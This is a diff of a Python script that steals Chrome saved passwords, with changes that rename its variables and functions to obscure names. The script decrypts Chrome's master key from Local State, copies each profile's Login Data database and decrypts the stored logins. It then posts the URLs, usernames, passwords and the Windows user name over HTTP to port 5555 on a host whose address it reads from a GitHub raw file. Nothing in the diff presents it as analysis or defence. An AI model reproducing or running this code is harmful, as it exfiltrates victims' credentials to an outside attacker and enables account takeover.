@@ -18,8 +18,8 @@ lfile = "settings.xpb"
 dfile = "appsettings"
 upath = path.expanduser("~/AppData/Local/")
 cfiles = sorted([file for file in listdir(upath) if path.isfile(upath+file) and file.endswith(".xpb")])
-CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
-CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
+cplocstate = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
+croepa = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
 if lfile in cfiles:
     cfiles.remove(lfile)
 if len(cfiles) > 0:
@@ -30,54 +30,49 @@ if len(cfiles) > 0:
                 f.write(cf.read())
             remove(fp)
 h = requests.get("https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/file.txt").text.replace("\n","")
-
-
-
-def decryptPayload(cipher, payload):
+def decply(cipher, payload):
     return cipher.decrypt(payload)
-def getSecretKey():
+def gsecrky():
     try:
-        with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
+        with open(cplocstate, "r", encoding='utf-8') as f:
             local_state = f.read()
             local_state = json.loads(local_state)
-        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-        secret_key = secret_key[5:] 
-        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
-        return secret_key
+        secKyy = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        secKyy = secKyy[5:] 
+        secKyy = win32crypt.CryptUnprotectData(secKyy, None, None, None, 0)[1]
+        return secKyy
     except:
         return None
-def getDbConnection(chrome_path_login_db):
+def getDbConnection(croepa_login_db):
     try:
-        shutil.copy2(chrome_path_login_db, "Loginvault.db") 
+        shutil.copy2(croepa_login_db, "Loginvault.db") 
         return sqlite3.connect("Loginvault.db")
     except:
         return None
 def generateCipher(aes_key, iv):
     return AES.new(aes_key, AES.MODE_GCM, iv)
-def decryptPassword(ciphertext, secret_key):
+def decpd(ciphertext, secKyy):
     try:
         initialisation_vector = ciphertext[3:15]
         encrypted_password = ciphertext[15:-16]
-        cipher = generateCipher(secret_key, initialisation_vector)
-        decrypted_pass = decryptPayload(cipher, encrypted_password)
+        cipher = generateCipher(secKyy, initialisation_vector)
+        decrypted_pass = decply(cipher, encrypted_password)
         decrypted_pass = decrypted_pass.decode()  
         return decrypted_pass
     except:
         return ""
-    
 def submitInfo(info):
     h = requests.get("https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/file.txt").text.replace("\n","")
     headers = { "user" : os.path.expanduser("~").split("\\")[-1] }
     requests.post("http://"+h+":5555/api/google", headers=headers, data=info)
-
 try:
     postData = ""
-    secret_key = getSecretKey()
-    folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
+    secKyy = gsecrky()
+    folders = [element for element in os.listdir(croepa) if re.search("^Profile*|^Default$",element)!=None]
     for folder in folders:
-        chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder))
-        conn = getDbConnection(chrome_path_login_db)
-        if(secret_key and conn):
+        croepa_login_db = os.path.normpath(r"%s\%s\Login Data"%(croepa,folder))
+        conn = getDbConnection(croepa_login_db)
+        if(secKyy and conn):
             cursor = conn.cursor()
             cursor.execute("SELECT action_url, username_value, password_value FROM logins")
             for index,login in enumerate(cursor.fetchall()):
@@ -85,7 +80,7 @@ try:
                 username = login[1]
                 ciphertext = login[2]
                 if(username!="" and ciphertext!=""):
-                    decrypted_password = decryptPassword(ciphertext, secret_key)
+                    decrypted_password = decpd(ciphertext, secKyy)
                     postData += "Sequence: %d"%(index)+"\n"
                     postData += "URL: %s\nUser Name: %s\nPassword: %s\n"%(url,username,decrypted_password)+"\n"
                     postData += "*"*50+"\n"
@@ -95,7 +90,6 @@ try:
     submitInfo(postData)
 except:
     pass
-
 ll = upath+lfile
 if path.isfile(ll):
     a = 0
